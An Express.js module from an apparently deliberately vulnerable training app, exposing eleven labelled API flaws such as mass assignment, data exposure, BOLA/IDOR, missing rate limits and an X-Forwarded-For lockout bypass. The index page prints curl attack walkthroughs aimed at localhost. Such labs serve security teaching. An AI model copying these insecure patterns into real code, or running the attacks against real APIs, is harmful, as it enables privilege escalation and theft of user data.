// API Security Flaws module: intentionally vulnerable JSON API training targets.
const express = require('express');
const { getDb } = require('../../lib/db');
const { page, esc, flagBox, hintBox, brief } = require('../../lib/page');
const { award, captured } = require('../../lib/flags');

const router = express.Router();

// VULN: brute-force counter lives in memory and is never enforced, so an
// attacker can hammer POST /api/login without lockout or slowdown.
const attempts = {};

// ---------- extra tables for the batch-02 labs (prefixed, self-contained) ----------
function apiExtraTables() {
  const db = getDb();
  db.exec(`
    CREATE TABLE IF NOT EXISTS api_profiles (
      user_id INTEGER PRIMARY KEY,
      display_name TEXT NOT NULL DEFAULT '',
      bio TEXT NOT NULL DEFAULT '',
      is_admin INTEGER NOT NULL DEFAULT 0,
      api_secret TEXT NOT NULL DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS api_invoices (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      description TEXT NOT NULL,
      amount REAL NOT NULL
    );
  `);
  const insP = db.prepare('INSERT OR IGNORE INTO api_profiles (user_id, display_name, bio, api_secret) VALUES (?,?,?,?)');
  insP.run(2, 'alice', 'Bug hunter in training', 'ak_live_alice_9f2c41');
  insP.run(3, 'bob', 'Just here for the stickers', 'ak_live_bob_77d0be');
  if (db.prepare('SELECT COUNT(*) AS c FROM api_invoices').get().c === 0) {
    const insI = db.prepare('INSERT INTO api_invoices (user_id, description, amount) VALUES (?,?,?)');
    insI.run(2, 'PenTrix Hoodie order', 39.99);
    insI.run(3, 'Sticker Pack order', 4.99);
  }
}
apiExtraTables();

// Rate-limit state for POST /api/v1/login, keyed by claimed client IP.
const v1LoginAttempts = {};

function requireLogin(req, res) {
  const user = req.session.user;
  if (!user) {
    res.status(401).json({ ok: false, error: 'Not logged in. Use GET /api/login/alice first.' });
    return null;
  }
  return user;
}

function userTable() {
  return getDb().prepare('SELECT * FROM users').all();
}

// GET /api/login/alice -> quick-login as alice (id 2) for lab convenience.
router.get('/login/alice', (req, res) => {
  req.session.user = { id: 2, username: 'alice', role: 'user' };
  res.json({ ok: true, loggedInAs: 'alice', id: 2 });
});

// PATCH /api/me -> v1 mass assignment. Every key in the JSON body is written
// straight into the users row of the logged-in user.
router.patch('/me', (req, res) => {
  const user = req.session.user;
  if (!user) return res.status(401).json({ ok: false, error: 'Not logged in. Use GET /api/login/alice first.' });

  const body = req.body || {};
  const keys = Object.keys(body);
  if (keys.length === 0) return res.status(400).json({ ok: false, error: 'Empty JSON body.' });

  const db = getDb();
  // VULN: mass assignment, no allowlist. Client-controlled keys (even "role"
  // or "id") become columns in the UPDATE, so privilege escalation is trivial.
  const setClause = keys.map((k) => `"${k}" = ?`).join(', ');
  const values = keys.map((k) => body[k]);
  db.prepare(`UPDATE users SET ${setClause} WHERE id = ?`).run(...values, user.id);

  const updated = db.prepare('SELECT id, username, email, role FROM users WHERE id = ?').get(user.id);
  let flag = null;
  if (updated && updated.role === 'admin') {
    flag = award(req, 'api', 'mass-assignment');
  }
  res.json({ ok: true, user: updated, flag });
});

// GET /api/users -> v2 excessive data exposure. Full user rows leak out.
router.get('/users', (req, res) => {
  const rows = userTable();
  const json = JSON.stringify(rows);
  if (json.includes('"password"')) {
    const flag = award(req, 'api', 'exposure');
    res.set('X-Pentrix-Flag', flag);
  }
  res.json(rows);
});

// GET /api/users/view -> browser-friendly rendering of the same leaky endpoint.
router.get('/users/view', (req, res) => {
  const rows = userTable();
  const json = JSON.stringify(rows, null, 2);
  let flagHtml = '';
  if (json.includes('"password"')) {
    flagHtml = flagBox(award(req, 'api', 'exposure'));
  } else if (captured(req, 'api', 'exposure')) {
    flagHtml = flagBox(`PENTRIX{api_exposure}`);
  }
  res.send(page('API: excessive data', `
    ${brief('Excessive Data Exposure', `This page renders the raw response of <code>GET /api/users</code>.
      Real APIs often return whole database rows; the <code>password</code> and <code>secret</code>
      fields below were never meant to leave the server.`)}
    ${flagHtml}
    <pre>${esc(json)}</pre>
    <p><a href="/api">Back to the module index</a></p>
  `));
});

// POST /api/login -> v3 credential stuffing target with no rate limiting.
router.post('/login', (req, res) => {
  const { username, password } = req.body || {};
  const key = String(username || '');
  // VULN: attempts are counted but never limited, so unlimited password
  // guesses can be fired at this endpoint with no lockout or CAPTCHA.
  attempts[key] = (attempts[key] || 0) + 1;

  const user = getDb().prepare('SELECT * FROM users WHERE username = ?').get(username);
  const ok = !!(user && user.password === password);
  let flag = null;
  if (ok && key === 'alice' && attempts[key] >= 15) {
    flag = award(req, 'api', 'rate-limit');
  }
  res.json({ ok, attempts: attempts[key], flag });
});

// ---------- v4: BOLA on orders ----------
router.get('/v1/orders/:id', (req, res) => {
  const user = requireLogin(req, res);
  if (!user) return;
  const order = getDb().prepare('SELECT * FROM orders WHERE id = ?').get(req.params.id);
  if (!order) return res.status(404).json({ ok: false, error: 'No such order.' });
  // VULN: broken object-level authorization. The :id is trusted and ownership
  // is never checked, so any logged-in user can read anyone's order.
  let flag = null;
  if (order.user_id !== user.id) {
    flag = award(req, 'api', 'bola-orders');
  }
  res.json({ ok: true, order, flag });
});

// ---------- v5: mass assignment of role on any user ----------
router.patch('/v1/users/:id', (req, res) => {
  const user = requireLogin(req, res);
  if (!user) return;
  const body = req.body || {};
  const keys = Object.keys(body);
  if (keys.length === 0) return res.status(400).json({ ok: false, error: 'Empty JSON body.' });
  const db = getDb();
  // VULN: mass assignment with no allowlist. Every key in the JSON body,
  // including "role", becomes a column in the UPDATE for any user id.
  const setClause = keys.map((k) => `"${k}" = ?`).join(', ');
  const values = keys.map((k) => body[k]);
  db.prepare(`UPDATE users SET ${setClause} WHERE id = ?`).run(...values, req.params.id);
  const updated = db.prepare('SELECT id, username, email, role FROM users WHERE id = ?').get(req.params.id);
  let flag = null;
  if (updated && updated.role === 'admin') {
    flag = award(req, 'api', 'mass-assign-role');
  }
  res.json({ ok: true, user: updated, flag });
});

// ---------- v6: api_secret exposed on the profile endpoint ----------
router.get('/v1/me', (req, res) => {
  const user = requireLogin(req, res);
  if (!user) return;
  const db = getDb();
  const row = db.prepare('SELECT id, username, email, role FROM users WHERE id = ?').get(user.id);
  const prof = db.prepare('SELECT api_secret FROM api_profiles WHERE user_id = ?').get(user.id);
  // VULN: excessive data exposure. The secret API key is bundled into the
  // profile response and handed to any client that asks.
  const me = Object.assign({}, row, { api_secret: prof ? prof.api_secret : null });
  let flag = null;
  if (me.api_secret) {
    flag = award(req, 'api', 'data-exposure-keys');
  }
  res.json({ ok: true, me, flag });
});

// ---------- v7: rate limit keyed by spoofable X-Forwarded-For ----------
router.post('/v1/login', (req, res) => {
  const { username, password } = req.body || {};
  const realIp = req.ip || req.socket.remoteAddress || 'unknown';
  const xff = String(req.headers['x-forwarded-for'] || '').split(',')[0].trim();
  const key = xff || realIp;
  v1LoginAttempts[key] = (v1LoginAttempts[key] || 0) + 1;
  // VULN: the rate-limit identity comes from the client-controlled
  // X-Forwarded-For header, so the lockout is bypassed by spoofing a new IP.
  if (v1LoginAttempts[key] > 3) {
    return res.status(429).json({ ok: false, error: 'Too many attempts. Try again later.', attempts: v1LoginAttempts[key] });
  }
  const dbUser = getDb().prepare('SELECT * FROM users WHERE username = ?').get(username);
  const ok = !!(dbUser && dbUser.password === password);
  let flag = null;
  if (ok && xff && (v1LoginAttempts[realIp] || 0) > 3) {
    // Genuine bypass: the real IP was locked out, yet login succeeded under a spoofed one.
    flag = award(req, 'api', 'ratelimit-xff');
  }
  if (ok) {
    req.session.user = { id: dbUser.id, username: dbUser.username, role: dbUser.role };
  }
  res.json({ ok, attempts: v1LoginAttempts[key], flag });
});

// ---------- v8: unsafe PUT overwrites read-only profile fields ----------
router.put('/v1/profile', (req, res) => {
  const user = requireLogin(req, res);
  if (!user) return;
  const body = req.body || {};
  const keys = Object.keys(body);
  if (keys.length === 0) return res.status(400).json({ ok: false, error: 'Empty JSON body.' });
  const db = getDb();
  // VULN: PUT replaces the profile object and copies every client-supplied
  // key, including the read-only is_admin flag the UI never sends.
  const setClause = keys.map((k) => `"${k}" = ?`).join(', ');
  const values = keys.map((k) => body[k]);
  db.prepare(`UPDATE api_profiles SET ${setClause} WHERE user_id = ?`).run(...values, user.id);
  const prof = db.prepare('SELECT user_id, display_name, bio, is_admin FROM api_profiles WHERE user_id = ?').get(user.id);
  let flag = null;
  if (prof && Number(prof.is_admin) === 1) {
    flag = award(req, 'api', 'unsafe-put');
  }
  res.json({ ok: true, profile: prof, flag });
});

// ---------- v9: v2 forgot the authorization check that v1 enforces ----------
function vUserRow(id) {
  return getDb().prepare('SELECT id, username, email, role, secret FROM users WHERE id = ?').get(id);
}

router.get('/v1/users/:id', (req, res) => {
  const user = requireLogin(req, res);
  if (!user) return;
  const target = vUserRow(req.params.id);
  if (!target) return res.status(404).json({ ok: false, error: 'No such user.' });
  // v1 does it right: you may read your own record, or any record as admin.
  if (Number(req.params.id) !== user.id && user.role !== 'admin') {
    return res.status(403).json({ ok: false, error: 'Forbidden: you can only view your own record.' });
  }
  res.json({ ok: true, user: target });
});

router.get('/v2/users/:id', (req, res) => {
  const user = requireLogin(req, res);
  if (!user) return;
  const target = vUserRow(req.params.id);
  if (!target) return res.status(404).json({ ok: false, error: 'No such user.' });
  // VULN: v2 was copy-pasted from v1 but the authorization check never made
  // it over, so any logged-in user can read anyone's full record.
  let flag = null;
  if (Number(req.params.id) !== user.id && user.role !== 'admin') {
    flag = award(req, 'api', 'api-version-bypass');
  }
  res.json({ ok: true, user: target, flag });
});

// ---------- v10: sequential invoice ids with no ownership check ----------
router.get('/v1/invoices/:id', (req, res) => {
  const user = requireLogin(req, res);
  if (!user) return;
  const inv = getDb().prepare('SELECT * FROM api_invoices WHERE id = ?').get(req.params.id);
  if (!inv) return res.status(404).json({ ok: false, error: 'No such invoice.' });
  // VULN: predictable sequential ids plus missing ownership check. Enumerate
  // :id and you read other users' invoices.
  let flag = null;
  if (inv.user_id !== user.id) {
    flag = award(req, 'api', 'id-enumeration');
  }
  res.json({ ok: true, invoice: inv, flag });
});

// ---------- v11: PATCH self-update with no allowlist ----------
router.patch('/v1/me', (req, res) => {
  const user = requireLogin(req, res);
  if (!user) return;
  const body = req.body || {};
  const keys = Object.keys(body);
  if (keys.length === 0) return res.status(400).json({ ok: false, error: 'Empty JSON body.' });
  const db = getDb();
  // VULN: no allowlist on the self-update. display_name and bio are expected,
  // but is_admin is accepted and persisted just the same.
  const setClause = keys.map((k) => `"${k}" = ?`).join(', ');
  const values = keys.map((k) => body[k]);
  db.prepare(`UPDATE api_profiles SET ${setClause} WHERE user_id = ?`).run(...values, user.id);
  const prof = db.prepare('SELECT user_id, display_name, bio, is_admin FROM api_profiles WHERE user_id = ?').get(user.id);
  let flag = null;
  if (prof && Number(prof.is_admin) === 1) {
    flag = award(req, 'api', 'patch-self-admin');
  }
  res.json({ ok: true, profile: prof, flag });
});

// GET /api -> module index page.
router.get('/', (req, res) => {
  const who = req.session.user ? esc(req.session.user.username) : 'nobody';
  const vulnList = module.exports.vulns
    .map((v) => `
      <div class="vuln">
        <h3>${esc(v.name)} <span class="diff">${esc(v.difficulty)}</span></h3>
        <p>${esc(v.how)}</p>
        ${hintBox(v.hint)}
      </div>`)
    .join('');

  res.send(page('API Security Flaws', `
    ${brief('API Security Flaws', `
      A tiny JSON API with eleven classic flaws: <b>mass assignment</b> on the profile
      endpoint, <b>excessive data exposure</b> on the user list, a login endpoint
      with <b>no rate limiting</b>, plus <b>BOLA</b> on orders and invoices,
      <b>role mass assignment</b>, <b>API key exposure</b>, a <b>rate limit bypassed
      via X-Forwarded-For</b>, <b>unsafe PUT</b> and <b>PATCH</b> privilege escalation,
      and a <b>v2 endpoint that forgot its authorization check</b>. You are currently
      logged in as <b>${who}</b>.
      Flags for the JSON endpoints arrive in the response body (<code>"flag"</code>)
      or the <code>X-Pentrix-Flag</code> response header (use <code>curl -i</code>),
      or claim them in your browser at the links below.`)}

    <h3>Quick login</h3>
    <p>
      <a class="btn" href="/api/login/alice">Log in as alice</a>
      <a class="btn" href="/api/users/view">View user list (browser)</a>
    </p>

    <h3>Attack 1: mass assignment (become admin)</h3>
    <pre>curl -c c.txt http://localhost:3000/api/login/alice
curl -b c.txt -X PATCH http://localhost:3000/api/me \\
  -H 'Content-Type: application/json' \\
  -d '{"role":"admin"}'</pre>

    <h3>Attack 2: excessive data exposure</h3>
    <pre>curl -i http://localhost:3000/api/users
# the JSON contains every password and secret; the flag is in X-Pentrix-Flag</pre>

    <h3>Attack 3: credential stuffing (no rate limit)</h3>
    <pre>for w in wrong1 wrong2 ... ; do
  curl -s -X POST http://localhost:3000/api/login \\
    -H 'Content-Type: application/json' -d "{\"username\":\"alice\",\"password\":\"$w\"}" >/dev/null
done
curl -s -X POST http://localhost:3000/api/login \\
  -H 'Content-Type: application/json' \\
  -d '{"username":"alice","password":"alice123"}'
# flag is awarded once the 15th+ attempt is the successful one</pre>

    <h3>Attack 4: BOLA on orders</h3>
    <pre>curl -c c.txt http://localhost:3000/api/login/alice
curl -b c.txt http://localhost:3000/api/v1/orders/1   # your own order
curl -b c.txt http://localhost:3000/api/v1/orders/2   # someone else's order</pre>

    <h3>Attack 5: mass assignment of role</h3>
    <pre>curl -c c.txt http://localhost:3000/api/login/alice
curl -b c.txt -X PATCH http://localhost:3000/api/v1/users/2 \\
  -H 'Content-Type: application/json' \\
  -d '{"role":"admin"}'</pre>

    <h3>Attack 6: API key exposure</h3>
    <pre>curl -c c.txt http://localhost:3000/api/login/alice
curl -b c.txt http://localhost:3000/api/v1/me
# read the api_secret field in the JSON response</pre>

    <h3>Attack 7: rate limit bypass via X-Forwarded-For</h3>
    <pre># burn the 3 attempts for your real IP on POST /api/v1/login
for i in 1 2 3 4; do
  curl -s -X POST http://localhost:3000/api/v1/login \\
    -H 'Content-Type: application/json' \\
    -d '{"username":"alice","password":"wrong"}'
done
# locked out? change your "IP" and log in for real
curl -s -X POST http://localhost:3000/api/v1/login \\
  -H 'Content-Type: application/json' -H 'X-Forwarded-For: 10.9.9.9' \\
  -d '{"username":"alice","password":"alice123"}'</pre>

    <h3>Attack 8: unsafe PUT (read-only field overwrite)</h3>
    <pre>curl -c c.txt http://localhost:3000/api/login/alice
curl -b c.txt -X PUT http://localhost:3000/api/v1/profile \\
  -H 'Content-Type: application/json' \\
  -d '{"display_name":"alice","is_admin":1}'</pre>

    <h3>Attack 9: v2 authorization bypass</h3>
    <pre>curl -c c.txt http://localhost:3000/api/login/alice
curl -b c.txt http://localhost:3000/api/v1/users/3   # 403, as it should be
curl -b c.txt http://localhost:3000/api/v2/users/3   # same record, no check</pre>

    <h3>Attack 10: invoice ID enumeration</h3>
    <pre>curl -c c.txt http://localhost:3000/api/login/alice
curl -b c.txt http://localhost:3000/api/v1/invoices/1   # yours
curl -b c.txt http://localhost:3000/api/v1/invoices/2   # keep counting...</pre>

    <h3>Attack 11: PATCH self-privilege escalation</h3>
    <pre>curl -c c.txt http://localhost:3000/api/login/alice
curl -b c.txt -X PATCH http://localhost:3000/api/v1/me \\
  -H 'Content-Type: application/json' \\
  -d '{"is_admin":1}'</pre>

    <h3>Vulnerabilities in this module</h3>
    ${vulnList}
  `));
});

module.exports = {
  id: 'api',
  name: 'API Security Flaws',
  tagline: 'Mass assignment, data exposure, and brute force on a JSON API.',
  description: 'A small JSON API with three classic flaws: a profile endpoint that merges every client-supplied field (including role), a user-list endpoint that leaks full database rows, and a login endpoint with no rate limiting. All flags are awarded server-side on real exploitation.',
  difficulty: 'Intermediate',
  vulns: [
    {
      id: 'mass-assignment',
      name: 'Mass Assignment',
      difficulty: 'Medium',
      hint: 'PATCH /api/me builds its SQL SET clause from Object.keys(req.body). Nothing stops you from adding fields the form never showed you, like "role".',
      how: 'Log in as alice, then send a JSON body with an extra field that escalates your privilege.',
    },
    {
      id: 'exposure',
      name: 'Excessive Data Exposure',
      difficulty: 'Easy',
      hint: 'GET /api/users runs SELECT * and returns the rows as JSON. Read the response body, or check the X-Pentrix-Flag response header.',
      how: 'Fetch the user list and read fields the client should never see.',
    },
    {
      id: 'rate-limit',
      name: 'Missing Rate Limiting',
      difficulty: 'Medium',
      hint: 'POST /api/login counts attempts per username but never blocks them. Fire 14+ wrong guesses for alice, then log in with the right password on the 15th attempt.',
      how: 'Brute force alice\u2019s password; the flag is awarded when the successful login follows 15 or more attempts.',
    },
    {
      id: 'bola-orders',
      name: 'BOLA: Order Access',
      difficulty: 'Medium',
      hint: 'GET /api/v1/orders/:id fetches any order by id and never checks that the order belongs to you. Alice owns order 1. Who owns order 2?',
      how: "Log in as alice, then fetch another user's order by id.",
    },
    {
      id: 'mass-assign-role',
      name: 'Mass Assignment: Role',
      difficulty: 'Easy',
      hint: 'PATCH /api/v1/users/:id builds its SQL SET clause from every key in your JSON body. The word "role" is just another key to the code.',
      how: 'Log in as alice and PATCH your own user id with a JSON body that sets role to admin.',
    },
    {
      id: 'data-exposure-keys',
      name: 'API Key Exposure',
      difficulty: 'Easy',
      hint: 'GET /api/v1/me returns your profile plus a field the client should never see. Read the whole JSON response, not just the pretty parts.',
      how: 'Log in as alice and fetch /api/v1/me; find the api_secret hiding in the response.',
    },
    {
      id: 'ratelimit-xff',
      name: 'Rate Limit Bypass via X-Forwarded-For',
      difficulty: 'Medium',
      hint: 'POST /api/v1/login locks an IP out after 3 bad attempts, but the "client IP" comes from the X-Forwarded-For header, which you control.',
      how: 'Trigger the lockout with bad passwords, then retry with the correct password and a spoofed X-Forwarded-For header.',
    },
    {
      id: 'unsafe-put',
      name: 'Unsafe PUT: Read-only Field Overwrite',
      difficulty: 'Medium',
      hint: 'PUT /api/v1/profile replaces your profile object and copies every key you send, including is_admin, which the UI never shows you.',
      how: 'Log in as alice and PUT a profile body containing is_admin set to 1.',
    },
    {
      id: 'api-version-bypass',
      name: 'API Version AuthZ Bypass',
      difficulty: 'Medium',
      hint: 'GET /api/v1/users/:id checks that you only read your own record (unless admin). Somebody copy-pasted the route for v2 and forgot the check.',
      how: 'Log in as alice, confirm v1 blocks you from reading user 3, then read the same record through v2.',
    },
    {
      id: 'id-enumeration',
      name: 'IDOR: Invoice Enumeration',
      difficulty: 'Easy',
      hint: 'Invoice ids are sequential integers and GET /api/v1/invoices/:id does not check ownership. If your invoice is id 1, whose is id 2?',
      how: "Log in as alice and enumerate invoice ids until you read another user's invoice.",
    },
    {
      id: 'patch-self-admin',
      name: 'PATCH Self-Privilege Escalation',
      difficulty: 'Medium',
      hint: 'PATCH /api/v1/me is meant for display_name and bio, but there is no allowlist. is_admin is just another column to the UPDATE.',
      how: 'Log in as alice and PATCH /api/v1/me with is_admin set to 1.',
    },
  ],
  router,
};
